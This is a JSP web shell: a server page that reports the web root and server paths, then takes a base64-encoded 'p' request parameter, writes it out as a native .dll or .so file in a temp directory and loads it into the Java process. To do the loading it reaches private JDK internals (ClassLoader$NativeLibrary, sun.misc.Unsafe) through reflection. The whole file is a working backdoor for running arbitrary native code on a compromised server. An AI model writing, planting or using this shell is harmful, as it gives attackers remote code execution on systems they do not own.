<%
    String p = request.getParameter("p");
    String t = request.getServletContext().getRealPath("/");
    java.io.PrintWriter outp = response.getWriter();
    outp.println("WebRootPath:");
    outp.println(t);
    t = request.getServletPath();
    outp.println("ServletPath:");
    outp.println(t);
    t = (new java.io.File(".").getAbsolutePath());
    outp.println("WebServerPath:");
    outp.println(t);
    java.util.Random random = new java.util.Random(System.currentTimeMillis());
    outp.println("if Dynamic Link Library will be auto load in uploading !!!");
    t = System.getProperty("os.name").toLowerCase();
    if (t.contains("windows")) {
        t = "C:/Windows/temp/dm" + random.nextInt(10000000) + "1.dll";
    }else {
        t = "/tmp/dm" + random.nextInt(10000000) + "1.so";
    }
    if (p != null) {
        try {
            java.io.FileOutputStream fos = new java.io.FileOutputStream(new java.io.File(t));
            fos.write(D(p));
            fos.close();
            N(t);
            outp.println("Dynamic Link Library is uploaded, and the path is: " + t);
            outp.println("load uploaded success !!!");
        } catch (Exception e) {
            outp.println(e.getMessage());
        }
    }
    outp.flush();
    outp.close();


%>

<%!
    private void N(String t) throws Exception {
        Object o;
        Class a = Class.forName("java.lang.ClassLoader$NativeLibrary");
        try {
            java.lang.reflect.Constructor c = a.getDeclaredConstructor(new Class[]{Class.class,String.class,boolean.class});
            c.setAccessible(true);
            o = c.newInstance(Class.class,t,true);
        }catch (Exception e){
            Class u = Class.forName("sun.misc.Unsafe");
            java.lang.reflect.Constructor<?> c = u.getDeclaredConstructor();
            c.setAccessible(true);
            sun.misc.Unsafe un = (sun.misc.Unsafe)c.newInstance();
            o =  un.allocateInstance(a);
        }
        java.lang.reflect.Method method = o.getClass().getDeclaredMethod("load", String.class, boolean.class);
        method.setAccessible(true);
        method.invoke(o, t, false);
    }

    private byte[] D(String p) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])(clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), p));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[])(decoder.getClass().getMethod("decode", String.class).invoke(decoder, p));
        }
    }
%>